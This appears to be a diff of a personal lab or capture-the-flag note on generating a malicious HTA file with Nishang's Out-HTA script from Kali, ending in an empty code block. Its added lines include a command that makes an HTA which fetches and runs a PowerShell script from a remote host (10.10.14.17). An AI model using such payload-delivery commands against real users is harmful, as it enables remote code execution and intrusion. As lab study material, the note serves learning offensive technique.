@@ -91,6 +91,11 @@ less ./Client/Out-HTA.ps1
 ```
 ![[Pasted image 20240509132014.png]]
 
+Will run the powershell
+```
+pwsh
+```
+
 ```
 .EXAMPLE
 PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1
@@ -101,6 +106,16 @@ Will load the PowerShell and execute the Command
 
 
 ```
-
+Out-HTA -PayloadURL http://10.10.14.17/singh.ps1
 ```
 ![[Pasted image 20240509150921.png]]
+
+To solve this error will run this command from kali and try running the command again
+```
+cat /opt/nishang/Client/Out-HTA.ps1 | xclip -selection primary
+```
+
+Will get the code in the paste selection which we have to copy and we should be good to go
+```
+
+```
